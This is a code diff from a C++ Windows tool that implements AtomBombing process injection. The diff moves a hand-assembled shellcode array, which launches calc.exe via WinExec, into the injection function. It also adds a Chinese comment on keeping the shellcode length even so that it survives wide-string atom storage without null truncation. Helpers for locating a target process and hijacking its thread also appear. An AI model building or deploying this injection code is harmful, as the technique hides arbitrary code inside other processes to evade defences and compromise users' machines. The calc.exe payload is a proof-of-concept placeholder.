@@ -200,28 +200,6 @@ UCHAR shellcode_00[] = {
     0x65, 0x78, 0x65, 0x00
 };
 
-unsigned char shellcode[] = {
-    // 构建"calc.exe"字符串到栈上
-    0x48, 0x31, 0xC0,               // xor rax, rax
-    0x50,                           // push rax        ; null terminator
-    0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
-    0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"
-
-    // 设置参数并调用
-    0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
-    0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
-    0x5A,                           // pop rdx         ; 第二个参数
-
-    // 调用WinExec
-    0x48, 0xB8,                     // mov rax,
-    0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
-    0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
-    0x48, 0xF7, 0xD0,               // not rax
-    0xFF, 0xD0                      // call rax
-};
-
-
-
 // Helper: Find target process by name
 DWORD FindTargetProcess(const char* procName) {
     PROCESSENTRY32 pe32;
@@ -270,6 +248,28 @@ HANDLE GetRemoteThreadHandle(DWORD pid) {
 
 int AtombombingExecute()
 {
+    unsigned char shellcode[] = {
+        // 构建"calc.exe"字符串到栈上
+        0x48, 0x31, 0xC0,               // xor rax, rax
+        0x50,                           // push rax        ; null terminator
+        0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
+        0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"
+
+        // 设置参数并调用
+        0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
+        0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
+        0x5A,                           // pop rdx         ; 第二个参数
+
+        // 调用WinExec
+        0x48, 0xB8,                     // mov rax,
+        0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
+        0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
+        0x48, 0xF7, 0xD0,               // not rax
+        0xFF, 0xD0                      // call rax
+    };
+
+
+
     NTSTATUS status = NULL;
 
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
@@ -281,7 +281,7 @@ int AtombombingExecute()
 
     // 需要先load这个，否则 GlobalAddAtomA 返回错误：5
     LoadLibraryA("user32.dll");
-    // Step 1: Store shellcode in global atom table
+    // Step 1: Store shellcode in global atom table, 这里注意shellcode大小一定是双数，因为是按照W写入的，之所以按照W写入是因为避免00截断，w是00 00截断，稍微好写shellcode
     ATOM atom = GlobalAddAtomW((LPCWSTR)shellcode);
     if (atom == 0) {
         std::cerr << "[!] Failed to add atom. Error: " << GetLastError() << std::endl;
